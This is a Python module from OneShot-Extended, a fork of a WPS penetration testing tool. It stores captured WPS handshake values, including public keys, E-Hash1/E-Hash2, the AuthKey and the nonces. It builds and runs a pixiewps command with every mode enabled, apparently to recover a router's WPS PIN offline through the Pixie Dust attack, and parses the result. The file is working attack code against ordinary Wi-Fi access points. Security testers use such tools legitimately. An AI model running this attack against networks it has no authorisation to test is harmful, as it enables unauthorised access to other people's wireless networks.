#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import subprocess

from src import logger

class Data:
    """Stored data used for pixiewps command."""

    def __init__(self):
        self.PKE = ''
        self.PKR = ''
        self.E_HASH1 = ''
        self.E_HASH2 = ''
        self.AUTHKEY = ''
        self.E_NONCE = ''
        self.R_NONCE = ''
        self.BSSID = ''
        self.RESULT = ''

    def getAll(self):
        """Output all pixiewps related variables."""

        return all([self.PKE, self.PKR, self.E_NONCE, self.R_NONCE, self.AUTHKEY, self.E_HASH1, self.E_HASH2, self.BSSID])

    def runPixieWps(self, show_command: bool = False, full_range: bool = False) -> str | bool:
        """Runs the pixiewps and attempts to extract the WPS pin from the output."""

        logger.info('Running Pixiewps…')
        command = self._getPixieCmd(full_range)

        if show_command:
            # Convert the command array into a string
            logger.info(' '.join(command))

        try:
            command_output = subprocess.run(command,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding='utf-8'
            )
        except (subprocess.CalledProcessError, FileNotFoundError) as error:
            logger.error(f'Pixiewps has exited on error: \n {error}')
            return False

        lines = command_output.stdout.splitlines()
        interesting_data = False
        ap_might_be_vulnerable = False
        pin_not_found = False

        for line in lines:
            if 'Looks like you have some interesting data!' in line:
                interesting_data = True
                continue
            if 'The AP might be vulnerable.' in line:
                ap_might_be_vulnerable = True
                continue
            if 'WPS pin not found!' in line:
                pin_not_found = True
                continue
            print(line)

        if command_output.returncode == 0:
            for line in lines:
                if ('[+]' in line) and ('WPS pin' in line):
                    pin = line.split(':')[-1].strip()

                    if pin == '<empty>':
                        pin = '\''

                    self.RESULT = 'validated'
                    logger.success('Pixie result: WPS PIN validated')
                    return pin

        if interesting_data and pin_not_found:
            self.RESULT = 'nonce-derivation-mismatch'
            logger.warning(
                'Pixie result: nonce/PRNG pattern matched, but the derived secret nonces '
                '(E-S1/E-S2) did not validate against E-Hash1/E-Hash2'
            )
        elif ap_might_be_vulnerable:
            self.RESULT = 'potential-weak-rng'
            logger.warning(
                'Pixie result: AP shows a potential weak-RNG signature, '
                'but this sample did not validate a WPS PIN'
            )
        elif pin_not_found:
            self.RESULT = 'not-found'
            logger.info('Pixie result: no WPS PIN recovered from this sample')
        else:
            self.RESULT = 'error'
            logger.warning(
                f'Pixie result: unexpected exit/status (code {command_output.returncode})'
            )

        return False

    def _getPixieCmd(self, full_range: bool = False) -> list[str]:
        """Generates a list representing the command for the pixiewps tool."""

        pixiecmd = ['pixiewps']
        pixiecmd.extend([
            '--pke', self.PKE,
            '--pkr', self.PKR,
            '--e-hash1', self.E_HASH1,
            '--e-hash2', self.E_HASH2,
            '--authkey', self.AUTHKEY,
            '--e-nonce', self.E_NONCE,
            '--r-nonce', self.R_NONCE,
            '--e-bssid', self.BSSID
        ])

        # Enable all modes
        pixiecmd.extend(['--mode', '1,2,3,4,5'])

        if full_range:
            pixiecmd.append('--force')

        return pixiecmd

    def clear(self):
        """Resets the pixiewps variables."""
        self.__init__()
